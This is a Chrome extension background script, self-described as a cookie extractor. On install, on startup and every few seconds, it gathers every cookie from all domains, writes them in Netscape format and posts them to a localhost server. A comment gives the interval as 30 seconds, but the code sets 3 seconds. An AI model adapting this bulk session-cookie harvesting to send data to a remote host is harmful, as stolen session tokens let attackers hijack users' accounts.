// background.js
let currentCookies = null;
const serverUrl = "http://localhost:8080";

// Set up interval to regularly send cookies to server
const COOKIE_SYNC_INTERVAL = 3000; // 30 seconds

chrome.runtime.onInstalled.addListener(() => {
  console.log('Cookie Extractor extension installed');
  // Immediately export and send cookies
  exportCookiesAndSend();
  
  // Set up periodic cookie extraction
  setUpPeriodicSync();
});

chrome.runtime.onStartup.addListener(() => {
  console.log('Chrome started, exporting cookies');
  // Immediately export and send cookies
  exportCookiesAndSend();
  
  // Set up periodic cookie extraction
  setUpPeriodicSync();
});

// Set up periodic sync of cookies
function setUpPeriodicSync() {
  // Clear any existing intervals
  if (window.cookieSyncInterval) {
    clearInterval(window.cookieSyncInterval);
  }
  
  // Set up new interval
  window.cookieSyncInterval = setInterval(() => {
    console.log("Periodic cookie sync...");
    exportCookiesAndSend();
  }, COOKIE_SYNC_INTERVAL);
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "manualExport") {
    exportCookiesAndSend();
    sendResponse({ success: true });
    return true;
  } else if (request.action === "checkCookies") {
    sendResponse({ cookies: currentCookies });
    return true;
  }
});

// Function that exports cookies and sends them to localhost server
function exportCookiesAndSend() {
  // Get all cookies from all domains
  chrome.cookies.getAll({}, (cookies) => {
    let cookieText = formatCookies(cookies);
    currentCookies = cookieText;
    
    // Send cookies to the local server
    sendCookiesToServer(cookieText);
  });
}

function sendCookiesToServer(cookieText) {
  fetch(serverUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain',
      'Accept': 'text/plain'
    },
    body: cookieText
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`Server responded with status: ${response.status}`);
    }
    return response.text();
  })
  .then(data => {
    console.log("Server response:", data);
  })
  .catch(error => {
    console.error("Error sending cookies to server:", error);
  });
}

// Format cookies in Netscape format
function formatCookies(cookies) {
  let output = "# Can Cookie\n";
  output += "# \n";
  output += "# \n\n";
  
  cookies.forEach(cookie => {
    // Format: domain flag path secure expiration name value
    const domain = cookie.domain.startsWith('.') ? cookie.domain : '.' + cookie.domain;
    const flag = "TRUE";
    const path = cookie.path || "/";
    const secure = cookie.secure ? "TRUE" : "FALSE";
    const expiration = Math.floor(cookie.expirationDate || (Date.now() / 1000 + 86400));
    
    output += `${domain}\t${flag}\t${path}\t${secure}\t${expiration}\t${cookie.name}\t${cookie.value}\n`;
  });
  
  return output;
} 